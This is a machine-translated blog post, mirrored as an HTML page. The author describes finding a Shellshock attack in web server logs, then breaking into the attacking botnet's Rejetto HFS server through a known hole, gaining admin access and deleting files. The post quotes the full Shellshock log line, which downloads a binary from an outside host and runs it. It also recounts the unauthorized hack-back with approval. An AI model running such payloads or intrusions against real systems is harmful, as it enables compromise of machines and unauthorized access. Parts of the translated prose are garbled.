<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Sunday tale of the importance of updating, even if you are a botnet operator</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Or do not threaten sunny Iceland, drinking tea in his Guangzhou. 



 The CDDP shows a possible botnet operator, as I imagine it. 
 Technical details ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Sunday tale of the importance of updating, even if you are a botnet operator</h1><div class="post__text post__text-html js-mediator-article">  Or do not threaten sunny Iceland, drinking tea in his Guangzhou. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/338/771/b60/338771b60af828535e1ebb51286d492d.jpg" alt="image"><br><br>  The CDDP shows a possible botnet operator, as I imagine it. <br>  Technical details will be minimal, mostly gloom.  Welcome. <br><a name="habracut"></a><br><h4>  Bots </h4><br>  It all started as standard, nothing foreshadowed trouble - on Saturday evening I decided to clean the overflowing / var / log on the web server.  Due to the specifics of this server, the logs on it are not of any significance, as is the fact of the partition overflow;  well, unless monitoring starts to write more often, yes new events are not analyzed.  In the process of cleaning, it turned out that the bots are still stubbornly trying to pick up the root password for ssh, trying to find PCPs that would fulfill their square-nesting wishes, and periodically scan something that doesn‚Äôt make sense.  Quiet and grace in one word.  Is that the eye clings to strangely large requests in the logs: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">1.2.3.4 - - [20/Mar/2015:18:39:36 +0000] <span class="hljs-string"><span class="hljs-string">"GET / HTTP/1.1"</span></span> 200 14932 <span class="hljs-string"><span class="hljs-string">"() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.xy:911/x26 -O /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo echo By China.Z &gt;&gt; /tmp/Run.sh;echo chmod 777 /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo rm -rf /tmp/Run.sh &gt;&gt; /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"</span></span> <span class="hljs-string"><span class="hljs-string">"() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.xy:911/x26 -O /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo echo By China.Z &gt;&gt; /tmp/Run.sh;echo chmod 777 /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo /tmp/China.Z-bdzm &gt;&gt; /tmp/Run.sh;echo rm -rf /tmp/Run.sh &gt;&gt; /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"</span></span></code> </pre> <br>  Here it is, shellshock.  Especially touching is the mandatory mention of the author by a separate call ‚Äúecho By China.Z‚Äù, which made me see what I‚Äôm supposed to download and execute. <br><br><h4>  Bot server </h4><br>  The server turned out to be open and lively, according to https he made a list of great files for all occasions: <br><br><img src="https://habrastorage.org/files/a0b/3c2/21f/a0b3c221f7ac4cc2ad91a1496831d183.png" alt="image"><br><br>  Do not look at the temp directory and the user adm, I did not immediately guess to take screenshots.  Initially there was no directory, instead of the user it was suggested to login.  It is better to look at the server uptime and the number of hits, or here, for example, to the <a href="https://www.virustotal.com/en/file/d883b0f2a9affe82e788e8f7db278408a29f91513158c0bb4863c33f2c37fa85/analysis/1428829729/">file</a> , as antiviruses see it.  Inside, of course, a lot of interesting things are able to do it in different ways, they even know how to mine (unlike you, the Central Bank :-), and spread (though ineptly), but this topic is not about reverse.  Is that remarkable that the strings gives lists of several dozen of the compiled IPv4 addresses, most of them from China. <br><br><h4>  Wonderful Rejetto HFS server </h4><br>  Honestly, I have never come across it, and if he had not so strongly declared his presence on the page below, so I would have left this site, having lost interest.  But this was not destiny.  The server had amazing <a href="http://www.rejetto.com/wiki/index.php%3Ftitle%3DHFS:_scripting_commands">functionality</a> .  Quotation: <br><blockquote>  File manipulation <br><br>  load |  A <br><br>  you'll love this one.  You can specify a URL.  It will load and expand to it. </blockquote><br><br>  Haha, god damn i will! <br><br>  In addition, this version had not only a ‚Äútechnological hole‚Äù, which allows using all this wonderful functionality using a simple netcat, but also a ready-made module to a meta-exploit for the very lazy.  Therefore, at first, user adm was made simple, and the jail (or whatever it is called the equivalent in Windows) was then mapped by the temp directory to the root of the C: \ drive.  Sleep swiftly covered, curiosity won out. <br><br><div class="spoiler">  <b class="spoiler_title">For voyeurs, a few pictures of the typical environment of the Chinese botmaster and potential Bitcoin millionaire (judging by the lists of miners, hehe):</b> <div class="spoiler_text">  Drive C: \ <br><br><img src="https://habrastorage.org/files/32f/f0a/e0d/32ff0ae0d7ec4c3d8c7b2855d5ad3b5c.png" alt="image"><br><br>  Disk D: \ <br><br><img src="https://habrastorage.org/files/f39/167/06b/f3916706b0684ad5b65749e12e9741d4.png" alt="image"><br><br>  Program Files: <br><br><img src="https://habrastorage.org/files/c81/759/953/c81759953c8d4241938d558954084693.png" alt="image"><br></div></div><br>  Nothing remarkable, and nothing to hinder at least a little access.  And of course, the bonus was that everything worked from under the administrator account.  Of the minuses - very low speed.  I did not investigate whether it was a Chinese firewall, or just a loaded machine, but the catch was limited to a speed of a couple of hundred kilobits per second, with peaks down to megabits.  And yes, everything is in Chinese, which made it difficult to study, requiring iteration through Google-translate. <br><br><h4>  Catch </h4><br><ol><li>  A variety of binaries for fan and profit <sup>tm</sup> . </li><li>  One and a half thousand addresses of infected machines (there should have been more, judging by the number of virus downloads, but either the files were cleaned or the hits and not the unique ones were considered).  Most of China, sent abuse. </li><li>  One hundred and fifty addresses with a division into groups - miners, loaders and even some kind of business.  Left for sweet. </li><li>  It was possible to be a stealth ninja, plant Trojans and bot-bottes, but it was too late, it was too lazy, and, frankly, Comrade Major, there are no such skills.  Therefore, the silence mode was not observed, the server squeaked / creaked when deleting / copying / files.  And as a result, the feeling when the connection is interrupted, and the swears in Chinese are almost audible is priceless. </li></ol><br><div class="spoiler">  <b class="spoiler_title">quality is nothing lulz everything</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/71e/2e1/f2f/71e2e1f2f6094ee781695f8da8be6881.jpg" alt="image"><br></div></div><br><h4>  Captain O Minute </h4><br><br><ul><li>  Do not sit under the administrator; </li><li>  Do not run web services as an administrator; </li><li>  Update software in a timely manner; </li><li>  Do not keep a botnet center on home PCs; </li><li>  Change its address regularly; </li><li>  Set up a firewall, even if you do not have a botnet; </li><li>  On every tricky ass, there is!  (with) </li></ul><br>  We, on our part, firmly believe in the last item, and continue to provide root access without a password for playing, now with the unresolved shellshock! <br><br>  Hope you enjoyed it.  If anyone needs for educational needs of something - write in a personal. </div><p>Source: <a href="https://habr.com/ru/post/255557/">https://habr.com/ru/post/255557/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../255537/index.html">Use Java smart cards to protect software. Chapter 5. Security</a></li>
<li><a href="../255539/index.html">Release elementary OS "Freya"</a></li>
<li><a href="../255547/index.html">Krovi: Big Data - as dream. Unplanned Series 5: Big Game. Private opinion</a></li>
<li><a href="../255549/index.html">Remember watched videos on youtube</a></li>
<li><a href="../255551/index.html">Scaling operations in the Intel Media SDK</a></li>
<li><a href="../255559/index.html">The digest of interesting materials for the mobile # 98 developer (April 6-12)</a></li>
<li><a href="../255561/index.html">Techniques for designing game architecture</a></li>
<li><a href="../255565/index.html">ASN1js and PKIjs - a year after creation</a></li>
<li><a href="../255569/index.html">SSO on FreeIPA + Apache + Flask-Login + JWT</a></li>
<li><a href="../255571/index.html">Preview version of WinJS 4.0 announced: universal UX, integration with AngularJS, updated ListView</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>